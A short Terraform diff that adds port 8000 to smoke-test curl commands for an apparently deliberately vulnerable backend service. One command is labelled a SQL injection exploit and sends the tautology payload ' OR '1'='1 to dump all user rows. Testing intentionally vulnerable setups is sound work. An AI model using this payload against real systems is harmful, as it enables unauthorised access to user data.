@@ -31,10 +31,10 @@ output "smoke_test_commands" {
   value = try(
     join("\n", [
       "# benign",
-      "curl -s 'http://${data.kubernetes_service.backend.status[0].load_balancer[0].ingress[0].hostname}/api/users?username=alice'",
+      "curl -s 'http://${data.kubernetes_service.backend.status[0].load_balancer[0].ingress[0].hostname}:8000/api/users?username=alice'",
       "",
       "# SQL injection exploit (returns all 3 rows)",
-      "curl -s --get 'http://${data.kubernetes_service.backend.status[0].load_balancer[0].ingress[0].hostname}/api/users' --data-urlencode \"username=' OR '1'='1\"",
+      "curl -s --get 'http://${data.kubernetes_service.backend.status[0].load_balancer[0].ingress[0].hostname}:8000/api/users' --data-urlencode \"username=' OR '1'='1\"",
     ]),
     "(NLB not yet ready)"
   )
